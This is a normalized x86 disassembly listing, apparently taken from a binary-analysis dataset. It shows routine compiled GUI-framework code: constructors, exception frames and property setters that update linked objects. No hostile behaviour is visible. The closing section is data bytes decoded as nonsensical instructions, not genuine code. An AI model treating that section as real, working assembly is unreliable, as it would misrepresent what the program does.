mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44a280
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_44a168
push ebx
push esi
push edi
call sub_404a1c
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_404650
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_419980
call sub_404650
mov eax [ edi + 0x30 ]
call sub_404650
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420010
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4049c4
sub_44a1b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_44a200
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4198f4
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_404800
mov edx edi
call sub_449f84
sub_44a24c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_44910c
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_449150
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_420098
sub_44a28c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_4202f4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_44a2f4
sub_44a2d4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_419740
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_420098
pop esi
pop ebx
retn
sub_44a2f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4199dc
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_44a310
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x298 ] 0x0
je r-xdata
mov eax [ esi + 0x298 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_44a378
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
call sub_437d60
test al al
jne r-xdata
movzx eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
call sub_43bc50
mov ebx eax
movzx eax [ esi + 0x4 ]
mov edx ebx
call sub_433ab4
mov ebp eax
test bp bp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov [ esp + 0x4 ] al
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
mov eax ebx
call sub_44ac48
mov edx ebp
call sub_44aca8
inc eax
je r-xdata
sub_44a41c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_44a43c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_44a45c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
movzx eax [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
movzx edx [ edi + 0x94 ]
mov eax edi
call sub_44a8b4
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
movzx eax [ esp ]
sub al 0x1
jb r-xdata
movzx eax [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_44a8b4
sub_44a5f8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4208e8
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_44a64c
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_404650
mov eax [ esi + 0x9c ]
call sub_404650
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_449ee0
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40f944
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_44a69c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_419f24
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_44a74c
movzx edx [ ebx + 0x69 ]
mov eax edi
call sub_44a7ac
movzx edx [ ebx + 0x6a ]
mov eax edi
call sub_44a8b4
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_44a9f0
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_44aa50
movzx edx [ ebx + 0x84 ]
mov eax edi
call sub_44aaac
movzx edx [ ebx + 0x86 ]
mov eax edi
call sub_44ab10
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44a74c
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_405974
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_405584
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_404800
test eax eax
je r-xdata
sub_44a7ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_44a8a4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_44a244
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_404800
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_44a230
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_44a7ac
sub_44a8b4
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
movzx edx [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
movzx eax [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
movzx eax [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
movzx edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_404800
test eax eax
je r-xdata
sub_44a930
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_405974
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_405584
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_419898
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_419898
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
sub_44a998
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_404800
test eax eax
je r-xdata
sub_44a9f0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_405974
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_405584
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_404800
test eax eax
je r-xdata
sub_44aa50
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_404800
test eax eax
je r-xdata
sub_44aaac
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
movzx eax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
movzx eax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
movzx edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_404800
test eax eax
je r-xdata
sub_44ab10
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ esp ]
cmp al [ ebx + 0x86 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
movzx eax [ esp ]
mov [ ebx + 0x86 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
movzx edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_404800
test eax eax
je r-xdata
sub_44ab70
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_405974
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_420534
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_44a74c
sub_44abbc
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_44abe4
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_44a04c
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
movzx edx [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_44a7ac
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_44ac7c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41b094
mov edi eax
mov eax esi
call sub_433dc0
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_44aca8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_44acec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44ad11
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ad18
retn
sub_44aefc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
push ss
push esp
inc edx
popad
jae r-xdata
inc esp
add [ eax ] cl
add [ eax ] al
xor al 0xae
inc esp
add [ eax - 0x17ffbfb8 ] bl
fiadd [ eax + eax - 0x28 ]
fiadd [ eax + eax - 0x54 ]
dec eax
inc eax
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ ebx + ebx * 8 + 0x44 ] ch
add [ eax - 0x47ffbb25 ] ah
fild [ eax + eax + 0x30 ]
mov al [ 0xffffffffe8004048 ]
inc esp
jb r-xdata
inc esp
add [ eax + 0x300044db ] bh
inc ebx
outsd
outsb
je r-xdata
add [ eax - 0x17ffbfb8 ] ah
inc ebx
outsd
outsb
je r-xdata
inc esp
inc ebx
outsd
outsb
je r-xdata
fiadd [ eax + eax - 0x1c ]
fild [ eax + eax + 0x48 ]
fild [ eax + eax - 0x8 ]
fiadd [ eax + eax + 0x14 ]
push esp
inc esp
jb r-xdata
fld [ eax + eax + 0x1c ]
fild [ eax + eax - 0xc ]
fadd [ eax + eax - 0x3c ]
fild [ eax + eax - 0x80 ]
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x30 ] si
scasd [ edi ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
scasd [ edi ]
inc esp
add [ eax ] cl
add [ eax ] al
clc
scasb [ edi ]
inc esp
add [ eax - 0x17ffbfb8 ] bl
fiadd [ eax + eax + 0x4 ]
fadd [ eax + eax - 0x54 ]
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ ebx + ebx * 8 + 0x44 ] ch
add [ eax - 0x47ffbb25 ] ah
fild [ eax + eax + 0x30 ]
fld [ eax + eax + 0x1c ]
fild [ eax + eax - 0xc ]
fadd [ eax + eax - 0x3c ]
fild [ eax + eax - 0x80 ]
fiadd [ eax + eax - 0x1c ]
inc esp
add [ eax + 0x300044db ] bh
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax * 4 - 0x52 ] si
inc esp
add [ esi + ebp * 4 ] cl
inc esp
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc esp
add [ eax - 0x17ffbfb8 ] bl
fiadd [ eax + eax - 0x4 ]
fld [ eax + eax - 0x54 ]
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax - 0x24 ] dh
inc esp
add [ ebx + ebx * 8 + 0x44 ] ch
add ah ah
fld [ eax + eax + 0x60 ]
fiadd [ eax + eax + 0x30 ]
fld [ eax + eax - 0x60 ]
fadd [ eax + eax - 0xc ]
fadd [ eax + eax + 0x7c ]
fiadd [ eax + eax - 0x80 ]
fiadd [ eax + eax - 0x78 ]
fiadd [ eax + eax ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + esi * 4 - 0x50 ] si
inc esp
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax - 0x50 ] si
inc esp
add ah al
scasb [ edi ]
inc esp
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
fiadd [ eax + eax - 0x80 ]
fiadd [ eax + eax - 0x78 ]
fiadd [ eax + eax ]
fld [ eax + eax + 0x8 ]
fadd [ eax + eax + 0x40 ]
fld [ eax + eax - 0x44 ]
fld [ eax + eax - 0x30 ]
fld [ eax + eax - 0xc ]
fld [ eax + eax - 0x10 ]
fld [ eax + eax + 0xf ]
push esp
inc esp
jb r-xdata
add ah ah
fld [ eax + eax + 0x60 ]
fiadd [ eax + eax + 0x30 ]
fld [ eax + eax - 0x60 ]
fadd [ eax + eax - 0xc ]
fadd [ eax + eax + 0x7c ]
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
pushad
mov al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x780044b0 ] ah
add [ eax ] al
add [ esi + ebp * 4 ] dh
inc esp
add [ eax - 0x17ffbfb8 ] bl
fiadd [ eax + eax - 0x28 ]
fiadd [ eax + eax - 0x54 ]
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax - 0x24 ] dh
inc esp
add [ ebx + ebx * 8 + 0x44 ] ch
fild [ eax + eax + 0x48 ]
fild [ eax + eax - 0x8 ]
fiadd [ eax + eax + 0x12 ]
push esp
inc esp
jb r-xdata
inc esp
add ah ah
outsd
insb
jae r-xdata
inc ecx
add [ eax - 0x62 ] al
inc ecx
add [ eax + ebx * 2 + 0x42 ] bh
add [ eax + 0x58 ] ch
inc edx
add [ eax + esi * 8 + 0x44 ] ah
add [ esi ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
enter 0x44b1 0x0
fld [ eax + eax + 0x8 ]
fadd [ eax + eax + 0x40 ]
fld [ eax + eax - 0x44 ]
fld [ eax + eax - 0x30 ]
fld [ eax + eax - 0xc ]
fld [ eax + eax - 0x10 ]
fld [ eax + eax + 0x11 ]
push esp
inc esp
jb r-xdata
add [ eax + 0x44da ] cl
outsd
insb
jae r-xdata
add [ ebp - 0x50bbffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x51 ] dh
dec eax
inc eax
add al ch
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ ebx + 0x44b128c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4f ] ch
inc esp
add [ eax ] bh
add [ eax ] al
adc al 0xb0
movsb [ edi ] [ esi ]
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
je r-xdata
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ esi + 0x44 ] cl
add [ esi + 0x3540044 ] bl
inc edx
add [ eax - 0x62 ] al
inc ecx
add [ esp + eax ] ch
inc edx
add [ ecx + ecx - 0x60afffbe ] dl
inc esp
add [ eax - 0x55 ] dh
inc esp
add [ eax + 0x7 ] ch
inc edx
add [ esp + eax + 0x42 ] cl
add [ esp + eax + 0x42 ] al
add [ eax + 0x7 ] dh
inc edx
add al bh
movsd [ edi ] [ esi ]
inc esp
add [ edx + ecx + 0x42 ] dl
add al bh
or [ edx ] eax
mov [ ecx ] cs
inc edx
add [ ecx + ecx + 0x9900042 ] bh
inc edx
add [ eax - 0x5667ffbc ] ah
inc esp
add [ eax ] dh
test eax 0xac700044
inc esp
add [ esp + edx * 2 ] dl
inc ebx
jne r-xdata
add [ eax + eax + 0x48ac0042 ] cl
inc eax
add [ eax - 0x17ffbfb8 ] ah
jae r-xdata
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + ecx ] bh
inc edx
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
insd
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
hlt
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
fdiv [ edx + 0x14070044 ]
push esp
inc ebx
jne r-xdata
inc esp
add [ eax + ecx - 0xa1bffbe ] ah
inc esp
add ah dh
pop es
inc edx
add [ eax - 0x23ffbdf8 ] cl
or [ edx ] al
inc esp
add [ eax + 0x8 ] dh
inc edx
add [ eax ] dh
cmc
je r-xdata
